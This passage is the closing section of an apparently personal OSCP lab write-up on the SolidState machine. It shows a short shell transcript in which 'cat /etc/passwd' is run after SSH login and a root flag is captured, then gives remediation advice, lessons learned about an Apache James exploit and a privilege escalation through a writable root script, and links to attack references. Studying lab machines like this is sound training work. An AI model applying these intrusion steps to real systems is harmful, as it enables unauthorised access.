mindy@10.129.1.80's password:
mindy@solidstate:~$ cat /etc/passwd
$ [21:34:50] loot flag root ac962bbabb938421660fe6a86cce89fc
```


## Remediation recommendations

| Finding | Recommendation |
|---|---|
| Exposed James RMA service | Restrict or disable the Remote Administration Tool and require unique administrator credentials with network access controls |
| Unpatched Apache James 2.3.2 | Upgrade to a supported release and remove the vulnerable arbitrary file-write behaviour |
| Mailbox contained SSH credentials | Do not send reusable shell credentials by email; use short-lived credentials or an approved secret-management system |
| Restricted shell used as a security boundary | Treat restricted shells as a usability control, not an access-control boundary; enforce least privilege through filesystem and service permissions |
| Root-owned writable script | Make `/opt/tmp.py` root-owned and non-writable by unprivileged accounts; review every privileged scheduler entry that executes it |
| Callback or completion-file persistence | Remove unauthorized files from `/etc/bash_completion.d` and audit shell startup paths for unexpected code |

## Lessons learned and vault links

1. Scan every port. The most useful service was the non-standard James administration port, not the web server.
2. A generic Nmap service label such as `rsip` is only a starting point. Read the actual banner.
3. Mail services can leak credentials through normal protocol operations. Test POP3 after obtaining mailbox access.
4. A restricted shell should be measured, not guessed at. `$SHELL`, `$PATH`, command availability, and redirection errors explain the failure mode.
5. A public exploit must be read and syntax-checked. Exploit-DB 50347 has hard-coded protocol assumptions and a login-triggered file-write design.
6. A writable root-owned script is only useful when a privileged process executes it. Confirm the scheduler and trigger before staging a payload.
7. Reverts invalidate permissions and host keys. Keep pre-reset evidence separate from final-target evidence.
8. Screenshots and loot can prove a result while the command transcript still has a gap. Mark the gap and repeat the missing step rather than inventing it.

### Related boxes

- [[OSCP/BOXES/WRITE UPS/Linux/Traverxec|Traverxec]] -- versioned web-server RCE, credential recovery, and argument-specific privilege escalation
- [[OSCP/BOXES/WRITE UPS/Linux/Traceback|Traceback]] -- exposed web shell, interpreter abuse, and login-triggered root script
- [[OSCP/BOXES/WRITE UPS/Linux/Poison|Poison]] -- mail-adjacent web enumeration, credential recovery, and SSH access
- [[OSCP/BOXES/WRITE UPS/Linux/Valentine|Valentine]] -- legacy service exploitation and careful evidence handling

## External resources

- [Exploit-DB 50347](https://www.exploit-db.com/exploits/50347) -- Apache James 2.3.2 authenticated RCE/file-write proof of concept
- [Apache James documentation](https://james.apache.org/) -- product and protocol context
- [HackTricks](https://book.hacktricks.wiki/en/index.html) -- service and privilege-escalation reference
- [RevShells](https://www.revshells.com/) -- interpreter-compatible callback generation
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) -- payload and bypass reference
- [CyberChef](https://gchq.github.io/CyberChef/) -- encoding and transformation checks
- [ippsec.rocks](https://ippsec.rocks/) -- practical technique and box-video search

## Related RUNBOOK V2 stages

- [[RUNBOOK V2/Start Here]]
- [[RUNBOOK V2/Linux - Service Scan]]
- [[RUNBOOK V2/Linux - Web Enum]]
- [[RUNBOOK V2/Linux - Shell Stabilise]]
- [[RUNBOOK V2/Linux - Local Enum]]
- [[RUNBOOK V2/Linux - Clean Down]]

## Why this matters for OSCP

SolidState rewards disciplined enumeration, proof-driven transitions, and a clean record of what changed. The same habits transfer directly to OSCP time pressure.
